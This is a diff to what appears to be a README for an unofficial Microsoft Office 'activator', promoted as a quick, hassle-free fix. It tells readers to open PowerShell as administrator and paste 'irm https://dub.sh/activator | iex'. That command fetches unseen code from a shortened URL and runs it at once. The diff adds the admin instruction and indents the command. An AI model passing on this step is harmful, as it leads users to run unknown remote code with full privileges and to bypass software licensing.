@@ -14,15 +14,15 @@ Microsoft OneNote
 Microsoft Publisher
 Microsoft Teams
 
-Simple Process: Minimal steps – just run the provided .bat file for instant activation.
+Simple Process: Minimal steps – just one command for instant activation.
 
-Hassle-Free: No complex setup or technical knowledge required.
+No complex setup or technical knowledge required.
 
 How to Use:
 
-Method 1: Use PowerShell
+Use PowerShell
 
-Open PowerShell (press Start and type "PowerShell").
+Open PowerShell as Admin (press Start and type "PowerShell").
 
 Copy and paste the following command into PowerShell, then press Enter:
 
@@ -31,9 +31,9 @@ powershell
 COPY AND PASTE THIS:
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-OR SHORT CODE: 
+                                                                              CODE: 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-irm https://dub.sh/activator | iex
+                                                                 irm https://dub.sh/activator | iex
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
